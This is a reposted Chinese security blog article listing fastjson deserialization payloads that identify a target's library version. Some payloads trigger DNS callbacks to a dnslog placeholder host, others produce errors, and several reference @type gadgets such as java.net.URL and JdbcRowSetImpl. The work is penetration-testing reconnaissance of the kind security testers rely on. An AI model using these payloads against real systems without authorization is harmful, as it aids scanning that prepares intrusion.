> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247487676&idx=1&sn=9f81c26d7c28f870920d7b4a352a8d8d

#  精选3：Fastjson反序列化漏洞区分版本号的方法大集合  
abc123info  希潭实验室   2025-07-22 00:33  
  
 Part1 前言   
  
大家好，我是ABC_123  
。欢迎大家关注公众号"希水涵精选录"。  
"希潭实验室"是ABC_123运营的第一个公众号，只发ABC_123本人的原创技术文章；  
而  
"希水涵精选录  
"  
是ABC_123运营的第二个公众号，  
专注于转载精心筛选的高质量技术文章  
。  
ABC_123会从海量的技术文章中摘出精品，  
把真正有价值、有干货的内容推荐给大家  
，同时也欢迎大家积极投稿给我，  
一起把好文章分享给更多人！  
  
转载声明：  
此篇文章的原创作者是f0ng，在此感谢。作者的公众号如下：  
  
  
每次测试遇到fastjson无法定位版本，部分文章里的payload也没有准确的版本范围，抽空对payload做了个测试，这里记录下  
使用常见的payload对fastjson版本进行测试，方便遇到fastjson进行较小范围的版本判断。本篇文章记录下常见的payload对于一些版本的判断测试。  
##   
##  Part2 通过dnslog判断版本   
  
测试的一切payload均采用fastjson的默认配置，本次测试只用到了
```
com.alibaba.fastjson.JSON.parse()
```

  
函数。  
  
#### 测试语句1：【fastjson>=1.2.37】  

```
{&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;, {&#34;@type&#34;: &#34;java.net.URL&#34;, &#34;val&#34;:&#34;http://§1§.{{URL}}&#34;}}&#34;&#34;}
```

#### 实验结论：可用范围1.2.37-1.2.83，即fastjson版本>=1.2.37；不可用版本1.2.1-1.2.36。  
  
  
测试语句2：  
【fastjson>=1.2.37】  

```
{{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://§1§.{{URL}}&#34;}:0
```

  
实验结论：  
可用范围
```
1.2.37
```

  
-
```
1.2.83
```

  
，即fastjson版本>=1.2.37；不可用版本1.2.1-1.2.36。  
  
  
测试语句3：【fastjson>=1.2.9】  

```
Set[{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://§1§.{{URL}}&#34;}]
```

  
实验结论：  
可用范围
```
1.2.9
```

  
-
```
1.2.83
```

  
，即fastjson版本>=1.2.9；不可用版本1.2.1-1.2.8。  
  
  
测试语句4：【fastjson>=1.2.9】  

```
Set[{&#34;@type&#34;:&#34;java.net.URL&#34;,&#34;val&#34;:&#34;http://§1§.{{URL}}&#34;}
```

  
实验结论：  
可用范围
```
1.2.9
```

  
-
```
1.2.83
```

  
，即fastjson版本>=1.2.9；不可用版本1.2.1-1.2.8。  
  
  
测试语句5：【1.2.9<=fastjson<=1.2.47】  

```
{&#34;name&#34;:{&#34;@type&#34;:&#34;java.net.InetAddress&#34;,&#34;val&#34;:&#34;§1§.{{URL}}&#34;}}
```

  
实验结论：  
可用  
范围
```
1.2.47
```

  
以下，
```
1.2.9
```

  
以上，即1.2.9<=fastjson版本<=1.2.47；不可用版本1.2.83、1.2.66-1.2.80、1.2.48-1.2.62、1.2.1  
-1.2.8。  
####   
  
测试语句6：【fastjson>=1.2.9】  

```
[{&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;:&#34;§1§.{{URL}}&#34;}}]
```

  
实验结论：  
可用范围
```
1.2.9
```

  
以上，即fastjson版本>=1.2.9，不可用版本1.2.1-1.2.8。  
####   
#### 测试语句7：【1.2.37<=fastjson<=1.2.68】  

```
{&#34;a&#34;:{&#34;@type&#34;:&#34;java.lang.AutoCloseable&#34;,&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONReader&#34;,&#34;reader&#34;:{&#34;@type&#34;:&#34;jdk.nashorn.api.scripting.URLReader&#34;,&#34;url&#34;:&#34;http://§1§.{{URL}}&#34;}}}
```

  
实验结论：  
可用范围
```
1.2.68
```

  
以下，
```
1.2.37
```

  
以上，即1.2.37<=fastjson版本<=1.2.68；不可用版本1.2.83、1.2.69-1.2.80、1.2.1-1.2.36。  
  
#### 测试语句8：【fastjson>=1.2.9以及fastjson=1.2.83】  

```
[{&#34;@type&#34;:&#34;java.lang.Exception&#34;,&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONException&#34;,&#34;x&#34;:{&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;:&#34;§1§.80.{{URL}}&#34;}}},{&#34;@type&#34;:&#34;java.lang.Exception&#34;,&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONException&#34;,&#34;message&#34;:{&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;:&#34;§1§.83.{{URL}}&#34;}}}]
```

####   
  
实验结论：  
带有83的dnslog记录只会在
```
fastjson 1.2.83
```

  
中出现。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Zickicb0jJV0LM4Mw4pld2dVSBfMkeL2HbokqZAj1yehaYJDWs7SVqDeLKQ5UgKWnQr0GY40SAzhdkC7BDDybktA/640?wx_fmt=png&from=appmsg&randomid=i6on9ixl&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
带有80的dnslog记录，可用范围1.2.9以上，不可用版本1.2.1-1.2.8。  
#### 测试语句9：【1.2.9<=fastjson<=1.2.68】  

```
[{&#34;@type&#34;: &#34;java.lang.AutoCloseable&#34;,&#34;@type&#34;: &#34;java.io.ByteArrayOutputStream&#34;},{&#34;@type&#34;: &#34;java.io.ByteArrayOutputStream&#34;},{&#34;@type&#34;: &#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;: &#34;§1§.{{URL}}&#34;}}]
```

  
实验结论：  
可用范围
```
1.2.9
```

  
以上，
```
1.2.68
```

  
以下，即1.2.9<=fastjson版本<=1.2.68；不可用版本1.2.83、1.2.69-1.2.80、1.2.1-1.2.8。  
####   
#### 测试语句10：【1.2.9<=fastjson<=1.2.47】  

```
{&#34;@type&#34;:&#34;java.net.InetAddress&#34;,&#34;val&#34;:&#34;§1§.{{URL}}&#34;}
```

  
实验结论：  
可用范围
```
1.2.9
```

  
以上，
```
1.2.47
```

  
以下，即1.2.9<=fastjson版本<=1.2.47；不可用版本1.2.83、1.2.66-1.2.80、1.2.48-1.2.62、1.2.1-1.2.8。  
####   
#### 测试语句11：【fastjson>=1.2.9】  
  
单独的两条：  

```
{&#34;@type&#34;:&#34;java.net.Inet4Address&#34;,&#34;val&#34;:&#34;§1§.{{URL}}&#34;}
{&#34;@type&#34;:&#34;java.net.Inet6Address&#34;,&#34;val&#34;:&#34;§1§.{{URL}}&#34;}
```

  
实验结论：  
可用范围
```
1.2.9
```

  
以上，即fastjson版本>=1.2.9；不可用版本1.2.1-1.2.8。  
####   
#### 测试语句12：【fastjson>=1.2.9】  

```
{&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;:&#34;§1§.{{URL}}&#34;}}
```

  
实验结论：  
可用范围
```
1.2.9
```

  
以上，即fastjson版本>=1.2.9；不可用版本1.2.1-1.2.8。  
####   
#### 测试语句13：【1.2.9<=fastjson<=1.2.24以及1.2.40<=fastjson<=1.2.47】  

```
[{&#34;@type&#34;:&#34;java.lang.Class&#34;,&#34;val&#34;:&#34;java.io.ByteArrayOutputStream&#34;},{&#34;@type&#34;:&#34;java.io.ByteArrayOutputStream&#34;},{&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:,&#34;val&#34;:&#34;§1§.{{URL}}&#34;}}]
```

  
实验结论：  
可用范围
```
1.2.9
```

  
以上，
```
1.2.24
```

  
以下或者
```
1.2.40
```

  
以上，
```
1.2.47
```

  
以下，即
```
1.2.9<=fastjson版本<=1.2.24
```

  
或者
```
1.2.40<=fastjson版本<=1.2.47；不可用版本1.2.83、1.2.66-1.2.80、1.2.48-1.2.62、1.2.25-1.2.39、1.2.1-1.2.8。
```

  
  

```


```

##  Part3 通过报错判断版本   
  
测试语句1：【fastjson<=1.2.24以及fastjson=1.2.83】  

```
{&#34;page&#34;:{&#34;pageNumber&#34;:1,&#34;pageSize&#34;:1,&#34;zero&#34;:{&#34;@type&#34;:&#34;java.lang.Exception&#34;,&#34;@type&#34;:&#34;org.XxException&#34;}}}
```

  
实验结论：  
在fastjson<=1.2.24以及fastjson=1.2.83的时候不会报错，其余均报错。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/FYb6AdABfia3ByAa0zEAJLFpEfKvFSSsXRHZwV1zCLQgCu6I1gzdxC76LJeMxQMiaP35Ww2SKlqWMdQC5kMcVP3w/640?wx_fmt=png&from=appmsg&randomid=dijjbuu2&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/FYb6AdABfia3ByAa0zEAJLFpEfKvFSSsX6iczmko28SxSA08Q7Hl8lT4CRnPLXL5CykB53aZhs8vGqtsBAsY02cw/640?wx_fmt=png&from=appmsg&randomid=w4j14uru&tp=webp&wxfrom=5&wx_lazy=1 "")  
####   
  
测试语句2：【fastjson<=1.2.68】  

```
{&#34;page&#34;:{&#34;pageNumber&#34;:1,&#34;pageSize&#34;:1,&#34;zero&#34;:{&#34;@type&#34;:&#34;java.lang.AutoCloseable&#34;,&#34;@type&#34;:&#34;java.io.ByteArrayOutputStream&#34;}}}
```

  
实验结论：  
在fastjson<=1.2.68的时候不会报错，其余均报错。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/FYb6AdABfia3ByAa0zEAJLFpEfKvFSSsXNhkhHUE2ic9vsicRCvMtDcfzqjH9JePOOvZgCX84BhY8Ubpcia5iaGpYJw/640?wx_fmt=png&from=appmsg&randomid=lhzm6n3s&tp=webp&wxfrom=5&wx_lazy=1 "")  
####   
#### 测试语句3：【1.2.9<=fastjson<=1.2.47】  

```
{&#34;a&#34;:{&#34;@type&#34;:&#34;java.lang.Class&#34;,&#34;val&#34;:&#34;com.sun.rowset.JdbcRowSetImpl&#34;},&#34;b&#34;:{&#34;@type&#34;:&#34;com.sun.rowset.JdbcRowSetImpl&#34;}}
```

  
实验结论：  
在1.2.9<=fastjson<=1.2.47的时候不会报错，其余均报错。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/FYb6AdABfia3ByAa0zEAJLFpEfKvFSSsXWqKcn4LEnoFVo58jC9Xpiap8pDZZsDribWWdmKg5m3iatRaCZZibiaZQUqA/640?wx_fmt=png&from=appmsg&randomid=j9rxaxcs&tp=webp&wxfrom=5&wx_lazy=1 "")  
####   
#### 测试语句4：【fastjson<=1.2.47】  

```
{&#34;zero&#34;: {&#34;@type&#34;: &#34;com.sun.rowset.JdbcRowSetImpl&#34;}}
```

  
实验结论：  
在fastjson<=1.2.47的时候不会报错，其余均报错。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/FYb6AdABfia3ByAa0zEAJLFpEfKvFSSsX4ltIH59UQaibA3k81uaVq6OicLIsrcxX7GlYTpPo3jBqJPib8anCdIBxQ/640?wx_fmt=png&from=appmsg&randomid=3brf2ar5&tp=webp&wxfrom=5&wx_lazy=1 "")  
##   
##  Part4 总结   
  
1.  
  关于fastjson的版本确定一直是从其他师傅的文章、工具里来看到的，通过本地靶场搭建实操与文章里的有些结论还是有一定出入的，测试并非全面，也并非完全正确，如果有错误的，还请师傅们斧正。  
  
2.  
  测试环境的搭建也是灵光一现，希望可以作为案例给其他师傅进行组件版本测试中进行参考。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Zickicb0jJV0KE38OajzpQIJIEXhuMbTmCo20ZZ6fzcmYxzLiap3n0za8ayfnbicIdnfWqQRdvOvewY2XLcHS2sicBg/640?wx_fmt=png&from=appmsg&randomid=h7eve4u0&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Zickicb0jJV0K8FN3ybEcU2XxcBjypnE8tscWib9esgqfxJ39yqAU8X3eEaGYK5S0YuQhBk0lflkrPl6m0ibH7r7zA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&randomid=4qmooa6m&tp=webp "")  
  
**希水涵精选录是ABC_123运营的第二个公众号，专注于转载精心筛选的优质技术文章，同时也欢迎大家积极投稿。**  
  
**Contact me: 2332887682#qq.comOR 0day123abc#gmail.com**  
  
**(replace # with @)**  
  
  
